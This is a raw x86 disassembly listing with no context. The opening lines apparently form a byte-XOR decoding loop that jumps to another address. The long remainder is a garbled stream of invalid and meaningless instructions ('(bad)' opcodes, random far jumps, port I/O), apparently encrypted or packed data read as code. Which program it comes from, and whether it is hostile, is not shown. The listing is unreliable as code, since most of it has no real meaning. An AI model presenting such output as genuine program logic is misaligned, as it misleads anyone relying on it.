  4060a2:	movzx  edx,BYTE PTR [ebp-0x1]
  4060a6:	xor    edx,eax
  4060a8:	mov    BYTE PTR [ebp-0x1],dl
  4060ab:	mov    al,BYTE PTR [ebp-0x1]
  4060ae:	mov    edx,DWORD PTR [ebp-0x30]
  4060b1:	mov    ebx,DWORD PTR [ebp-0xc]
  4060b4:	xor    edx,esi
  4060b6:	add    edx,edi
  4060b8:	imul   edx,ebx
  4060bb:	mov    ebx,DWORD PTR [ebp-0x8]
  4060be:	mov    BYTE PTR [edx+ebx*1],al
  4060c1:	mov    eax,DWORD PTR [ebp-0x30]
  4060c4:	mov    edx,DWORD PTR [ebp-0xc]
  4060c7:	xor    eax,esi
  4060c9:	add    eax,edi
  4060cb:	imul   eax,edx
  4060ce:	mov    edx,DWORD PTR [ebp-0x8]
  4060d1:	jmp    0x408469
  4060d6:	leave  
  4060d7:	pop    es
  4060d8:	xchg   DWORD PTR ds:0x47490549,eax
  4060de:	(bad)  
  4060df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e0:	or     bl,cl
  4060e2:	cmp    al,0x54
  4060e4:	jecxz  0x406069
  4060e6:	jno    0x4060a9
  4060e8:	jnp    0x406165
  4060ea:	hlt    
  4060eb:	pushf  
  4060ec:	jnp    0x406169
  4060ee:	stos   BYTE PTR es:[edi],al
  4060ef:	pop    ebx
  4060f0:	out    dx,eax
  4060f1:	icebp  
  4060f2:	inc    ebp
  4060f3:	pop    ebp
  4060f4:	aaa    
  4060f5:	push   es
  4060f6:	jb     0x40612c
  4060f8:	(bad)  
  4060f9:	stc    
  4060fa:	fld    QWORD PTR [ebx-0x65]
  4060fd:	sbb    bh,BYTE PTR [eax]
  4060ff:	retf   0xc3f1
  406102:	jnp    0x4060b1
  406104:	je     0x406170
  406106:	mov    esi,0x5f322c65
  40610b:	inc    edx
  40610c:	popa   
  40610d:	pusha  
  40610e:	add    eax,0xd85ea243
  406113:	adc    al,0x2a
  406115:	mov    al,0x53
  406117:	cmc    
  406118:	in     al,0x29
  40611a:	and    eax,0x1edf3dbd
  40611f:	push   eax
  406120:	push   ds
  406121:	mov    dl,0x1
  406123:	(bad)  
  406124:	repnz cmp ch,BYTE PTR [eax+0x76]
  406128:	nop
  406129:	imul   ebx,DWORD PTR [edi],0xffffffc5
  40612c:	enter  0x4ffd,0x74
  406130:	lahf   
  406131:	pop    ebp
  406132:	les    edi,FWORD PTR [ecx]
  406134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406135:	mov    bh,0xde
  406137:	sbb    BYTE PTR [edi],0x2f
  40613a:	getsec 
  40613c:	push   es
  40613d:	in     al,0x8
  40613f:	popf   
  406140:	and    DWORD PTR [edi-0x577d9de8],ebp
  406146:	ret    
  406147:	pop    ds
  406148:	lods   al,BYTE PTR ds:[esi]
  406149:	cdq    
  40614a:	adc    al,0x7c
  40614c:	jo     0x40611f
  40614e:	jbe    0x4060f5
  406150:	mov    dl,0x9
  406152:	ret    
  406153:	xchg   BYTE PTR [ecx],cl
  406155:	out    0xd2,al
  406157:	xchg   DWORD PTR [esi-0x60d85687],esi
  40615d:	jl     0x4061c1
  40615f:	mov    ebx,0x1da09d4
  406164:	pop    ecx
  406165:	sbb    ah,BYTE PTR [edi+edi*1-0x104d62d1]
  40616c:	sub    al,0xa8
  40616e:	xor    DWORD PTR [ecx+eax*1],eax
  406171:	pop    ss
  406172:	fmulp  st(0),st
  406174:	mov    BYTE PTR [ecx+0x5454f62c],ch
  40617a:	add    BYTE PTR [ebx-0x7c],ch
  40617d:	push   0xffffffde
  40617f:	cmp    ecx,esp
  406181:	out    dx,al
  406182:	add    BYTE PTR [edx+eax*8+0x7d2ac698],dh
  406189:	xlat   BYTE PTR ds:[ebx]
  40618a:	leave  
  40618b:	pop    edi
  40618c:	test   DWORD PTR [edx+0x650a928d],edi
  406192:	cdq    
  406193:	mov    esi,DWORD PTR [esi]
  406195:	imul   BYTE PTR [ebx]
  406197:	sbb    BYTE PTR [edi-0x4a6c7e4d],ch
  40619d:	mov    al,0x72
  40619f:	add    eax,0xcb773ac9
  4061a4:	stos   DWORD PTR es:[edi],eax
  4061a5:	sbb    eax,esi
  4061a7:	mov    bh,0xe
  4061a9:	cli    
  4061aa:	mov    ch,0x1a
  4061ac:	out    0xc4,eax
  4061ae:	xchg   ebp,eax
  4061af:	inc    ebp
  4061b0:	addr16 and esp,esp
  4061b3:	or     dl,BYTE PTR [ecx]
  4061b5:	pop    ebp
  4061b6:	xchg   esi,eax
  4061b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061b8:	cmc    
  4061b9:	adc    eax,0x12360210
  4061be:	and    BYTE PTR [edi-0x74],dh
  4061c1:	push   ebx
  4061c2:	jmp    0xd14253a7
  4061c7:	cmp    al,0x15
  4061c9:	adc    al,0x59
  4061cb:	push   edi
  4061cc:	(bad)  
  4061cd:	(bad)  
  4061ce:	arpl   dx,cx
  4061d0:	bound  ecx,QWORD PTR [edx+edi*2]
  4061d3:	loope  0x40622b
  4061d5:	popf   
  4061d6:	out    0xfa,eax
  4061d8:	pop    esi
  4061d9:	ud0    esp,DWORD PTR [edx+0x6980e188]
  4061e0:	fcmovnu st,st(3)
  4061e2:	pop    esp
  4061e3:	mov    ds,WORD PTR [ebp+0x7]
  4061e6:	js     0x406207
  4061e8:	mov    eax,0xc9072a70
  4061ed:	in     eax,dx
  4061ee:	pop    es
  4061ef:	jne    0x4061ce
  4061f1:	fnstenv [esi+0x2b7a5501]
  4061f7:	or     eax,0xe572a8ca
  4061fc:	mov    ecx,es
  4061fe:	pop    ecx
  4061ff:	inc    edi
  406200:	cli    
  406201:	inc    esi
  406202:	test   eax,0xa0b4771c
  406207:	repz arpl WORD PTR [ecx],sp
  40620a:	outs   dx,DWORD PTR ds:[esi]
  40620b:	ins    DWORD PTR es:[edi],dx
  40620c:	jmp    FWORD PTR [eax-0x773f41b9]
  406212:	es call 0xfe8b:0xbd39769d
  40621a:	aas    
  40621b:	mov    eax,ds:0x3d9f5ad4
  406220:	stc    
  406221:	sub    esp,0xe2e19e6e
  406227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406228:	adc    al,0xea
  40622a:	call   0x2d4139ba
  40622f:	mov    ds:0xde38b44d,eax
  406234:	je     0x406202
  406236:	jmp    0xf0ef2b6
  40623b:	cmp    BYTE PTR [edi-0x5206764a],ch
  406241:	inc    eax
  406242:	inc    ebx
  406243:	arpl   sp,si
  406245:	mov    eax,ds:0x200298fc
  40624a:	and    dh,bh
  40624c:	add    al,0xc8
  40624e:	and    eax,0xdf4e71a1
  406253:	adc    BYTE PTR [ecx-0xda616c1],0x70
  40625a:	enter  0x7023,0x71
  40625e:	or     al,0x37
  406260:	ins    BYTE PTR es:[edi],dx
  406261:	xchg   ecx,eax
  406262:	xchg   ebp,eax
  406263:	push   ss
  406264:	pop    eax
  406265:	jmp    0x406227
  406267:	xlat   BYTE PTR ds:[ebx]
  406268:	mov    dl,0x85
  40626a:	cmp    eax,0x46ea85a6
  40626f:	inc    ebx
  406270:	(bad)  
  406271:	scas   eax,DWORD PTR es:[edi]
  406272:	jmp    0x912562f5
  406277:	jo     0x406288
  406279:	mov    bl,0xaf
  40627b:	pop    esp
  40627c:	icebp  
  40627d:	nop
  40627e:	retf   
  40627f:	mov    eax,0xd7c5cdd6
  406284:	fist   DWORD PTR [edi+ecx*2+0x47]
  406288:	fdivr  QWORD PTR [eax]
  40628a:	mov    al,ds:0xbaecb8e9
  40628f:	and    DWORD PTR [ebp-0x8],eax
  406292:	into   
  406293:	xor    cl,BYTE PTR [eax-0x35]
  406296:	ja     0x40629b
  406298:	fldz   
  40629a:	xor    ecx,ebx
  40629c:	lock dec ecx
  40629e:	xchg   esi,eax
  40629f:	pop    ss
  4062a0:	ror    bh,0x3d
  4062a3:	sub    BYTE PTR [ebx-0x11],bl
  4062a6:	outs   dx,DWORD PTR ds:[esi]
  4062a7:	jmp    0xcd2efc63
  4062ac:	xlat   BYTE PTR ds:[ebx]
  4062ad:	fwait
  4062ae:	fs mov ebx,0xde0bc09c
  4062b4:	push   eax
  4062b5:	mov    ds:0x15b321de,eax
  4062ba:	jb     0x406311
  4062bc:	inc    ebp
  4062bd:	jecxz  0x40626e
  4062bf:	cs mov ebp,0x7125dd7
  4062c5:	dec    edx
  4062c6:	pop    esi
  4062c7:	and    eax,ebx
  4062c9:	add    dh,BYTE PTR [esi-0x80]
  4062cc:	sub    DWORD PTR [edx+0x76],esi
  4062cf:	lods   al,BYTE PTR ds:[esi]
  4062d0:	(bad)  
  4062d1:	jge    0x40634a
  4062d3:	and    eax,0x2233bdf3
  4062d8:	hlt    
  4062d9:	adc    BYTE PTR [ecx-0x2e],dh
  4062dc:	mov    eax,ds:0x9132eb96
  4062e1:	push   ebp
  4062e2:	inc    esp
  4062e3:	mov    ebp,0x7880c7bf
  4062e8:	dec    ecx
  4062e9:	outs   dx,BYTE PTR ds:[esi]
  4062ea:	mov    ebx,0x2af45456
  4062ef:	aaa    
  4062f0:	scas   al,BYTE PTR es:[edi]
  4062f1:	ds jb  0x4062c3
  4062f4:	mov    dl,BYTE PTR [eax]
  4062f6:	pushf  
  4062f7:	hlt    
  4062f8:	inc    ebp
  4062f9:	out    0xa5,eax
  4062fb:	cmc    
  4062fc:	mov    ebx,0x38612189
  406301:	jne    0x4062c2
  406303:	jo     0x40633a
  406305:	shl    cl,cl
  406307:	loop   0x40632d
  406309:	je     0x406350
  40630b:	mov    ebx,0xc0a92782
  406310:	pushf  
  406311:	fdiv   DWORD PTR [esi+esi*2+0x73aff72d]
  406318:	gs pop es
  40631a:	add    BYTE PTR [edx-0x30882e27],ah
  406320:	push   ebp
  406321:	push   ecx
  406322:	stc    
  406323:	fs aad 0x71
  406326:	jno    0x40639b
  406328:	push   ecx
  406329:	push   edi
  40632a:	pusha  
  40632b:	ins    BYTE PTR es:[edi],dx
  40632c:	mov    ebx,0x3f10095
  406331:	or     BYTE PTR ds:0xa9a2bdb0,dh
  406337:	sbb    al,BYTE PTR [edx]
  406339:	in     al,0xf2
  40633b:	mov    esp,0x32bb6daf
  406340:	lods   al,BYTE PTR ds:[esi]
  406341:	dec    eax
  406342:	mov    cl,0x2a
  406344:	je     0x40636d
  406346:	icebp  
  406347:	push   esi
  406348:	mov    eax,DWORD PTR [edi]
  40634a:	aad    0x3
  40634c:	hlt    
  40634d:	xchg   ax,ax
  40634f:	jg     0x4063b3
  406351:	mov    edi,0x162f83e5
  406356:	ds push edx
  406358:	inc    ebp
  406359:	das    
  40635a:	mov    DWORD PTR [edi],ebx
  40635c:	in     al,dx
  40635d:	and    al,0x78
  40635f:	dec    esi
  406360:	icebp  
  406361:	leave  
  406362:	or     BYTE PTR [ecx-0x16],ch
  406365:	or     DWORD PTR [ebx+0x2b957e96],ebp
  40636b:	std    
  40636c:	stos   DWORD PTR es:[edi],eax
  40636d:	sbb    al,0xe0
  40636f:	pop    ds
  406370:	pop    ecx
  406371:	xchg   edx,eax
  406372:	and    eax,DWORD PTR [edx]
  406374:	lahf   
  406375:	je     0x406395
  406377:	mov    es,WORD PTR [eax-0x3d]
  40637a:	jns    0x4063e1
  40637c:	shl    DWORD PTR [edx],0x2f
  40637f:	inc    esi
  406380:	test   BYTE PTR [ebx+0x78731e51],0xc3
  406387:	out    dx,eax
  406388:	in     al,dx
  406389:	(bad)  
  40638a:	pop    edi
  40638b:	bound  ecx,QWORD PTR [esi+eax*4]
  40638e:	scas   al,BYTE PTR es:[edi]
  40638f:	sahf   
  406390:	push   ebp
  406391:	inc    ecx
  406392:	sbb    DWORD PTR [esi+0x3dc200bf],0x4d613077
  40639c:	cld    
  40639d:	cwde   
  40639e:	mov    eax,ds:0x2c650844
  4063a3:	add    DWORD PTR [esi],ebx
  4063a5:	cli    
  4063a6:	sahf   
  4063a7:	cli    
  4063a8:	lds    si,DWORD PTR ds:0x96415651
  4063af:	mov    ch,0x2d
  4063b1:	je     0x4063df
  4063b3:	sbb    al,0x1
  4063b5:	push   ss
  4063b6:	imul   ebp,ebx,0xd92c5717
  4063bc:	adc    al,0x92
  4063be:	shl    BYTE PTR [ecx+0x4d4b60ef],1
  4063c4:	inc    ebp
  4063c5:	sub    BYTE PTR [edx+ecx*8+0x1904d609],0x94
  4063cd:	mov    ebx,0xc07e9131
  4063d2:	and    eax,0xffffffba
  4063d5:	in     eax,dx
  4063d6:	sub    al,0xe4
  4063d8:	pusha  
  4063d9:	sub    eax,0x7b0cd207
  4063de:	cmp    BYTE PTR [edi+0x646d990e],bl
  4063e4:	push   esp
  4063e5:	(bad)  
  4063e6:	lods   al,BYTE PTR ds:[esi]
  4063e7:	jl     0x4063e4
  4063e9:	cmp    ecx,DWORD PTR [ecx-0x3a790655]
  4063ef:	cmp    DWORD PTR [ecx-0x62],edx
  4063f2:	push   eax
  4063f3:	out    dx,eax
  4063f4:	mov    dh,0x64
  4063f6:	int3   
  4063f7:	fwait
  4063f8:	mov    ecx,0xbe6071c5
  4063fd:	(bad)  [ebx+esi*2-0x716cca66]
  406404:	iret   
  406405:	xchg   edx,eax
  406406:	dec    ebp
  406407:	mov    BYTE PTR [edi+0x70],cl
  40640a:	xchg   esi,eax
  40640b:	mov    bh,0xcd
  40640d:	(bad)  
  40640e:	mov    ecx,0xcba62c22
  406413:	into   
  406414:	push   es
  406415:	xor    eax,0xd37e922d
  40641a:	(bad)  
  40641b:	adc    al,0x9f
  40641d:	je     0x40640a
  40641f:	fld    QWORD PTR [esi]
  406421:	les    esp,FWORD PTR [edx-0x1ca46b85]
  406427:	out    dx,al
  406428:	repnz push 0xffffffab
  40642b:	out    dx,al
  40642c:	push   es
  40642d:	out    0x6d,al
  40642f:	popf   
  406430:	arpl   WORD PTR [eax-0x27],dx
  406433:	fcomp  DWORD PTR [eax-0x7ad108a8]
  406439:	fs retf 
  40643b:	jae    0x40646c
  40643d:	sub    DWORD PTR [ecx-0x4d],0x44
  406441:	loop   0x406424
  406443:	pop    ebp
  406444:	lds    esi,FWORD PTR [ebx+0x6754536a]
  40644a:	xor    DWORD PTR [edi-0x1803e0ff],ebx
  406450:	add    BYTE PTR [eax],bl
  406452:	int3   
  406453:	xor    eax,0xd944658b
  406458:	fisub  DWORD PTR [ebp-0x2d]
  40645b:	loope  0x40645a
  40645d:	jl     0x406466
  40645f:	cmc    
  406460:	les    ecx,FWORD PTR [ecx]
  406462:	xchg   ebx,eax
  406463:	fs pop edi
  406465:	mov    ds:0x9cf7bc10,al
  40646a:	and    esi,esi
  40646c:	rcr    BYTE PTR [edi+0x462d88ba],0xf2
  406473:	pop    ebp
  406474:	(bad)  
  406475:	xchg   BYTE PTR [esi+0x3],bl
  406478:	aad    0xe6
  40647a:	sbb    edi,DWORD PTR [edi+0x39]
  40647d:	scas   eax,DWORD PTR es:[edi]
  40647e:	sub    eax,0x2b29ba4
  406483:	hlt    
  406484:	in     al,dx
  406485:	dec    esp
  406486:	dec    edx
  406488:	call   0xa4e3:0xa09690b0
  40648f:	sub    esi,eax
  406491:	adc    eax,0xb78d1635
  406496:	out    dx,eax
  406497:	add    BYTE PTR [edx+0x1658fd72],cl
  40649d:	pop    ss
  40649e:	xchg   edx,eax
  40649f:	sti    
  4064a0:	inc    DWORD PTR gs:[edx+0xbab01]
  4064a7:	and    ebp,DWORD PTR [esi]
  4064a9:	push   edi
  4064aa:	pop    es
  4064ab:	dec    edx
  4064ac:	(bad)  
  4064ad:	lods   eax,DWORD PTR ds:[esi]
  4064ae:	adc    BYTE PTR [ebp+0x352f5147],ah
  4064b4:	mov    eax,ds:0x50230664
  4064b9:	fdivr  st(7),st
  4064bb:	fsubr  QWORD PTR ds:0x6aee3202
  4064c1:	mov    ds:0x498ae1f,al
  4064c6:	push   ss
  4064c7:	imul   ebx,DWORD PTR [edx],0x77784a75
  4064cd:	xor    ecx,DWORD PTR [edi+0x598e17e5]
  4064d3:	sti    
  4064d4:	test   DWORD PTR [ebp+0x75],esi
  4064d7:	in     eax,0x7
  4064d9:	cmc    
  4064da:	idiv   BYTE PTR [ebx]
  4064dc:	inc    edx
  4064dd:	mov    ds:0x547c05d2,al
  4064e2:	scas   al,BYTE PTR es:[edi]
  4064e3:	xor    eax,0x29587594
  4064e8:	(bad)  
  4064e9:	sbb    eax,0x6cf81594
  4064ee:	jne    0x4064ec
  4064f0:	xchg   edi,eax
  4064f1:	or     BYTE PTR [edx-0x76],al
  4064f4:	arpl   WORD PTR [eax],di
  4064f6:	xchg   edi,eax
  4064f7:	xchg   edx,eax
  4064f8:	(bad)  
  4064f9:	jmp    0x4fb9:0xba521655
  406500:	pcmpeqw mm7,mm0
  406503:	mov    eax,0x80cb6e94
  406508:	nop
  406509:	xchg   DWORD PTR [edx-0x7b],esi
  40650c:	or     dh,BYTE PTR [ecx]
  40650e:	inc    edx
  40650f:	xor    BYTE PTR [ebp-0x64],0x59
  406513:	inc    esp
  406514:	lds    ebx,FWORD PTR [ecx-0x53]
  406517:	scas   eax,DWORD PTR es:[edi]
  406518:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406519:	sahf   
  40651a:	mov    al,ds:0x1d163851
  40651f:	nop
  406520:	dec    esp
  406521:	xor    edi,DWORD PTR ds:0x8fc8e9c7
  406527:	push   ebp
  406528:	jecxz  0x4064cf
  40652a:	xor    BYTE PTR [ebx-0x45],0xb1
  40652e:	outs   dx,BYTE PTR ds:[esi]
  40652f:	test   DWORD PTR [ecx+0x63],edi
  406532:	fadd   st(4),st
  406534:	lods   eax,DWORD PTR ds:[esi]
  406535:	sbb    BYTE PTR [ecx-0x2e],dl
  406538:	push   0xffffff99
  40653a:	add    BYTE PTR [esp+eax*1+0x455f44e8],ch
  406541:	cld    
  406542:	push   esp
  406543:	je     0x4064d6
  406545:	stos   BYTE PTR es:[edi],al
  406546:	out    dx,eax
  406547:	cdq    
  406548:	nop
  406549:	push   ds
  40654a:	shr    BYTE PTR [edi+ebx*8+0x5d62a62a],0x2f
  406552:	lahf   
  406553:	add    eax,0xa6c62963
  406558:	cmp    ebx,DWORD PTR [edx-0x6c]
  40655b:	into   
  40655c:	enter  0x847b,0xcd
  406560:	push   0x51cccfb5
  406565:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406566:	pop    ss
  406567:	cmp    eax,0x42998d05
  40656c:	lds    eax,FWORD PTR [esi+0x3e618e9e]
  406572:	cmp    ch,BYTE PTR [edx]
  406574:	add    BYTE PTR [ecx-0x7c01cba6],cl
  40657a:	xchg   DWORD PTR [ebp-0x2d5c6dd0],eax
  406580:	sub    eax,eax
  406582:	mov    eax,DWORD PTR [edx]
  406584:	mov    dl,0x11
  406586:	xchg   ecx,eax
  406587:	iret   
  406588:	fmul   DWORD PTR [ebx-0x7d]
  40658b:	ja     0x406523
  40658d:	ss stos DWORD PTR es:[edi],eax
  40658f:	retf   
  406590:	fld    TBYTE PTR [ecx]
  406592:	ins    BYTE PTR es:[edi],dx
  406593:	lea    ebp,ds:0x126a0126
  406599:	mov    BYTE PTR [eax+0x7c0b3027],ah
  40659f:	jmp    0x406564
  4065a1:	shl    BYTE PTR [ebx-0x7d],cl
  4065a4:	out    0x9,eax
  4065a6:	mov    ah,0xf
  4065a8:	inc    edx
  4065a9:	jmp    0x9805:0x77d106e6
  4065b0:	cmp    edx,DWORD PTR [ecx]
  4065b2:	mov    cl,0x68
  4065b4:	repz cld 
  4065b6:	adc    esp,ebp
  4065b8:	adc    cl,al
  4065ba:	fidivr WORD PTR [edx]
  4065bc:	out    dx,eax
  4065bd:	nop
  4065be:	das    
  4065bf:	pushf  
  4065c0:	bnd jge 0x406636
  4065c3:	xchg   edx,eax
  4065c4:	call   0xc345:0x54b24cba
  4065cb:	xor    BYTE PTR [edx],bl
  4065cd:	in     eax,0x8f
  4065cf:	(bad)  
  4065d0:	enter  0xc750,0xea
  4065d4:	jge    0x406626
  4065d6:	scas   eax,DWORD PTR es:[edi]
  4065d7:	ds ins BYTE PTR es:[edi],dx
  4065d9:	fld    TBYTE PTR [esi]
  4065db:	fdiv   QWORD PTR [esi]
  4065dd:	cmc    
  4065de:	jns    0x4065b2
  4065e0:	arpl   WORD PTR [ecx-0x5d],cx
  4065e3:	cmp    al,0xf3
  4065e5:	cs (bad) 
  4065e7:	aam    0x9e
  4065e9:	outs   dx,BYTE PTR ds:[esi]
  4065ea:	in     al,dx
  4065eb:	jmp    0x40656f
  4065ed:	and    esp,DWORD PTR [edi+edx*8+0x42485b14]
  4065f4:	(bad)  
  4065f5:	int3   
  4065f6:	loop   0x406598
  4065f8:	push   ebp
  4065f9:	shr    BYTE PTR [edi],cl
  4065fb:	nop
  4065fc:	jns    0x4065c0
  4065fe:	xor    DWORD PTR [edi],edi
  406600:	cmp    BYTE PTR [bx+0x195f],ah
  406605:	cdq    
  406606:	push   esp
  406607:	imul   edi,DWORD PTR [ecx+0x76],0x443a6a5a
  40660e:	dec    esi
  40660f:	jo     0x4065d2
  406611:	and    al,0x6
  406613:	jecxz  0x4065e9
  406615:	pop    ecx
  406616:	dec    ebp
  406617:	add    ch,ah
  406619:	ins    BYTE PTR es:[edi],dx
  40661a:	ins    BYTE PTR es:[edi],dx
  40661b:	(bad)  
  40661d:	mov    ebx,0x7c445c3f
  406622:	adc    esi,edi
  406624:	icebp  
  406625:	push   edx
  406626:	stc    
  406627:	daa    
  406628:	inc    eax
  406629:	or     eax,0xe346675f
  40662e:	sub    al,0x2f
  406630:	sbb    ch,BYTE PTR [esi-0x10]
  406633:	adc    ah,ah
  406635:	sbb    edi,DWORD PTR [ecx+0xd]
  406638:	call   0xd7425abd
  40663d:	push   0x5e1bbd46
  406642:	and    eax,0x42b40555
  406647:	sub    eax,0xe518e84b
  40664c:	and    edi,DWORD PTR [ebp+0x573f1eed]
  406652:	scas   al,BYTE PTR es:[edi]
  406653:	cmp    eax,esp
  406655:	js     0x406648
  406657:	int    0x71
  406659:	rcr    BYTE PTR [edi+eax*4-0x210c26ab],1
  406660:	dec    BYTE PTR [eax-0x4c2af6ec]
  406666:	sbb    DWORD PTR [ebp+0x464a1886],ebx
  40666c:	push   esi
  40666d:	cmc    
  40666e:	inc    edi
  40666f:	dec    ebp
  406670:	mov    BYTE PTR [esi+eiz*2],ch
  406673:	cmp    eax,0x93c3d8ab
  406678:	push   cs
  406679:	xchg   esi,eax
  40667a:	push   ebx
  40667b:	adc    eax,0xa7ec2235
  406680:	stos   DWORD PTR es:[edi],eax
  406681:	inc    esp
  406682:	xor    DWORD PTR [edi-0x28a3862f],0x59
  406689:	neg    DWORD PTR [ebp+0x67]
  40668c:	mov    esi,0x9a1e6673
  406691:	je     0x4066dd
  406693:	inc    ecx
  406694:	sub    edx,ecx
  406696:	js     0x40669d
  406698:	sub    ebp,ecx
  40669a:	in     al,dx
  40669b:	in     al,dx
  40669c:	add    ch,ch
  40669e:	dec    ebp
  40669f:	cmp    al,dl
  4066a1:	add    ebx,DWORD PTR [ebx]
  4066a3:	cmp    DWORD PTR [ebp+0x640deac1],ecx
  4066a9:	mov    ebx,?
  4066ab:	add    esi,DWORD PTR [edx+0x16]
  4066ae:	fnsave [edx-0x39]
  4066b1:	mov    al,0xf0
  4066b3:	and    eax,edx
  4066b5:	sub    al,0xf
  4066b7:	int    0x4
  4066b9:	outs   dx,BYTE PTR ds:[esi]
  4066ba:	arpl   cx,sp
  4066bc:	inc    edi
  4066bd:	fcmovb st,st(6)
  4066bf:	fstp   st(0)
  4066c1:	test   eax,0x9af6eac7
  4066c6:	das    
  4066c7:	in     al,0xe5
  4066c9:	jecxz  0x40667b
  4066cb:	es push edi
  4066cd:	fistp  QWORD PTR [edx+0x22a54ecf]
  4066d3:	outs   dx,DWORD PTR ds:[esi]
  4066d4:	adc    DWORD PTR [ecx-0x2],ebx
  4066d7:	fild   QWORD PTR [ebp+0x1440b0d4]
  4066dd:	push   edx
  4066de:	mov    WORD PTR [esi-0x4bd9aa85],gs
  4066e4:	mov    esi,0xff9a9bc8
  4066e9:	sbb    eax,0x45dd1daf
  4066ee:	lds    edx,FWORD PTR [edi+0x74bfedf5]
  4066f4:	ror    BYTE PTR [eax+0x4a408fd2],0x88
  4066fb:	adc    eax,0x8b91104b
  406700:	das    
  406701:	pop    es
  406702:	or     dl,BYTE PTR [edi-0x4c]
  406705:	push   cs
  406706:	scas   al,BYTE PTR es:[edi]
  406707:	pop    es
  406708:	push   ecx
  406709:	mov    edx,0xaa378a28
  40670e:	shr    ebp,cl
  406710:	xchg   esp,eax
  406711:	dec    esp
  406712:	jae    0x4066b6
  406714:	mov    ecx,esp
  406716:	sbb    ecx,DWORD PTR [ebp+ebp*1+0x75]
  40671a:	in     eax,0x63
  40671c:	push   0xd85d839d
  406721:	mov    fs,WORD PTR [eax-0x65]
  406724:	pmulhuw mm5,QWORD PTR [ecx-0x1a3b531c]
  40672b:	js     0x4066b9
  40672d:	stos   BYTE PTR es:[edi],al
  40672e:	hlt    
  40672f:	popa   
  406730:	hlt    
  406731:	push   0x4b4e8e14
  406736:	pop    ecx
  406737:	repz sbb ah,BYTE PTR ds:0x1d83af23
  40673e:	xor    al,0xd4
  406740:	mov    ds:0x938f6ef2,al
  406745:	mov    al,0x20
  406747:	add    DWORD PTR [edi],ebp
  406749:	inc    esp
  40674a:	scas   al,BYTE PTR es:[edi]
  40674b:	fisttp QWORD PTR [ebp-0x3a]
  40674e:	(bad)  
  40674f:	mov    ebp,DWORD PTR [esi+0x6c]
  406752:	ret    
  406753:	mov    ds:0x305618d1,al
  406758:	dec    ecx
  406759:	inc    eax
  40675a:	xlat   BYTE PTR ds:[ebx]
  40675b:	(bad)  
  40675c:	jmp    0xdca1e2b8
  406761:	inc    ebx
  406762:	popa   
  406763:	or     DWORD PTR [edx],esp
  406765:	out    0x10,al
  406767:	in     eax,0x1e
  406769:	repnz sub dh,dl
  40676c:	or     eax,0x9fdfd78
  406771:	or     DWORD PTR [eax],ebx
  406773:	stc    
  406774:	xchg   BYTE PTR [ebp+0x1],dh
  406777:	out    0x49,al
  406779:	mov    ch,cl
  40677b:	xor    dh,dh
  40677d:	lods   eax,DWORD PTR ds:[esi]
  40677e:	sbb    al,BYTE PTR [edi]
  406780:	fnsave [eax]
  406782:	clc    
  406783:	inc    ebp
  406784:	xchg   ecx,eax
  406785:	std    
  406786:	sbb    esi,eax
  406788:	add    eax,0x5f053225
  40678d:	cli    
  40678e:	pop    ss
  40678f:	xor    eax,0xfbf82802
  406794:	adc    ah,BYTE PTR [esi+0x66c0d435]
  40679a:	pusha  
  40679b:	lock mov ebp,esp
  40679e:	jnp    0x40674f
  4067a0:	mov    al,ds:0x7a5ac272
  4067a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067a6:	mov    bh,0xf3
  4067a8:	daa    
  4067a9:	pop    ds
  4067aa:	xchg   esi,eax
  4067ab:	dec    edx
  4067ac:	(bad)  
  4067ad:	mul    BYTE PTR [eax-0x3f]
  4067b0:	inc    esi
  4067b1:	inc    edx
  4067b2:	mov    esp,DWORD PTR [ecx]
  4067b4:	pushf  
  4067b5:	jl     0x406770
  4067b7:	dec    esi
  4067b8:	(bad)  
  4067b9:	ficom  WORD PTR [ebx-0x12]
  4067bc:	(bad)  
  4067bd:	std    
  4067be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067bf:	ss jbe 0x40678a
  4067c2:	test   BYTE PTR [esi-0x6059f3e4],ch
  4067c8:	jmp    0xd274:0x671f5a20
  4067cf:	int3   
  4067d0:	xor    ch,BYTE PTR [edx-0x1f]
  4067d3:	inc    edx
  4067d4:	dec    esp
  4067d5:	ins    BYTE PTR es:[edi],dx
  4067d6:	mov    BYTE PTR [ecx],ch
  4067d8:	(bad)  ds:0xb08b591e
  4067de:	dec    edi
  4067df:	lods   al,BYTE PTR ds:[esi]
  4067e0:	les    eax,FWORD PTR [ebp+0x61ebdd64]
  4067e6:	je     0x4067e7
  4067e8:	push   ss
  4067e9:	in     eax,0xba
  4067eb:	mov    cl,0x56
  4067ed:	mov    al,ds:0x96df2519
  4067f2:	xlat   BYTE PTR ds:[ebx]
  4067f3:	outs   dx,DWORD PTR ds:[esi]
  4067f4:	aam    0x8d
  4067f6:	aaa    
  4067f7:	cmp    al,0x9a
  4067f9:	mov    fs,WORD PTR [edi+0x4a]
  4067fc:	aam    0xbe
  4067fe:	iret   
  4067ff:	neg    BYTE PTR [edx]
  406801:	leave  
  406802:	pop    esp
  406803:	test   ecx,ecx
  406805:	pop    ebp
  406806:	out    dx,eax
  406807:	or     dh,BYTE PTR [esi+edi*2-0x6b987b7]
  40680e:	daa    
  40680f:	xchg   BYTE PTR [eax-0x55211e44],al
  406815:	or     cl,BYTE PTR [edx]
  406817:	add    eax,0x9275b884
  40681c:	popf   
  40681d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40681e:	xchg   ebx,eax
  40681f:	iret   
  406820:	jns    0x4067ce
  406822:	scas   eax,DWORD PTR es:[edi]
  406823:	inc    esi
  406824:	sub    BYTE PTR [eax+0x442431e7],0x92
  40682b:	jne    0x4067f9
  40682d:	out    dx,al
  40682e:	rcl    DWORD PTR [ebx+eax*2-0x35],1
  406832:	dec    ebp
  406833:	outs   dx,DWORD PTR ds:[esi]
  406834:	out    dx,eax
  406835:	shl    esi,cl
  406837:	dec    ebx
  406838:	cmp    BYTE PTR es:[esi-0x4899d02b],ah
  40683f:	int3   
  406840:	sahf   
  406841:	(bad)  
  406842:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406843:	retf   
  406844:	mov    edi,fs
  406846:	(bad)  
  406847:	ins    DWORD PTR es:[edi],dx
  406848:	in     eax,dx
